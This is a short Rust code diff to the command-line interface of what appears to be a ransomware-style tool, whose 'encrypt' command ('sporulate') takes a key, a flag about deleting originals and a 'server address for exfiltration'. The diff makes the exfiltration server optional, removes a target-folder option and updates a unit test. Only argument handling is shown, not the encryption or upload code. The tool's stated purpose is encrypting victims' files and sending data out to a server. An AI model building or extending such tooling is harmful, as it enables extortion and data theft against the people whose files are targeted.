@@ -40,12 +40,8 @@ struct EncryptArgs {
     no_delete: bool,
 
     /// Server address for exfiltration
-    #[arg(short = 's', long, default_value = "http://localhost:8080")]
-    server: String,
-
-    /// Target folder on the server for exfiltration
-    #[arg(short = 't', long)]
-    target_folder: Option<String>,
+    #[arg(short = 's', long)]
+    server: Option<String>,
 }
 
 #[derive(Parser, Debug)]
@@ -88,13 +84,7 @@ pub fn run() -> Result<(), AppError> {
     debug!("Arguments: {:?}", args);
 
     match args {
-        Cli::Encrypt(args) => sporulate(
-            &args.path,
-            &args.key,
-            &args.no_delete,
-            &args.server,
-            &args.target_folder,
-        ),
+        Cli::Encrypt(args) => sporulate(&args.path, &args.key, &args.no_delete, &args.server),
         Cli::Decrypt(args) => disinfect(&args.path, &args.key, &args.no_delete),
         Cli::Generate(args) => germinate(&args.path),
     }
@@ -116,17 +106,14 @@ mod tests {
             "/var/main-public.key",
             "-n",
             "-s",
-            "http://example.com",
-            "-t",
-            "backup",
+            "http://example.com:2673",
         ]);
 
         if let Cli::Encrypt(args) = args {
             assert_eq!(args.path.to_str().unwrap(), "/tmp");
             assert_eq!(args.key.to_str().unwrap(), "/var/main-public.key");
             assert!(args.no_delete);
-            assert_eq!(args.server, "http://example.com");
-            assert_eq!(args.target_folder.unwrap(), "backup");
+            assert_eq!(args.server, Some("http://example.com:2673".to_string()));
         } else {
             panic!("Expected encrypt args");
         }
